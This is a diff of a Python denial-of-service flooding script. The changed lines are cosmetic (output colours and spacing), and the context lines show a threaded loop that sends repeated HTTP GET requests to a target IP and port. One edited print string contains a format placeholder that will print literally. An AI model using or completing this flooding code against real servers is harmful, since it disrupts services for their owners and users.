@@ -60,7 +60,7 @@ def goForDosThatThing():
                         dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                         time.sleep(1) 
-                        print(Colors.BOLD + Colors.OKBLUE + "Sent packet" + Colors.FAIL + str(Count.packetCounter))
+                        print(Colors.BOLD + Colors.OKBLUE + "Sent packet {' ' *10}" + Colors.FAIL + str(Count.packetCounter))
                         Count.packetCounter = Count.packetCounter + 1
                         print(Colors.BOLD + Colors.BOLD + "successful:> " + Colors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + Colors.OKGREEN + "")
                     except socket.error:
@@ -79,15 +79,15 @@ try:
     print(Colors.BOLD + Colors.OKBLUE + '''
     Banner                                                                  
           ''')
-    print(Colors.BOLD + Colors.OKGREEN + "Loading > [     1] 0% ")
+    print(Colors.BOLD + Colors.WARNING + "Loading > [     1] 0% ")
     time.sleep(1)
-    print(Colors.BOLD + Colors.OKGREEN + "Loading > [     2] 25%")
+    print(Colors.BOLD + Colors.WARNING + "Loading > [     2] 25%")
     time.sleep(1)
     print(Colors.BOLD + Colors.WARNING + "Loading > [     3] 50%")
     time.sleep(1)
     print(Colors.BOLD + Colors.WARNING + "Loading > [     4] 75%")
     time.sleep(1)
-    print(Colors.BOLD + Colors.FAIL + "Loading > [        5] 100%")
+    print(Colors.BOLD + Colors.FAIL + "Loading > [     5] 100%")
     
     for i in range(threads):
         try:
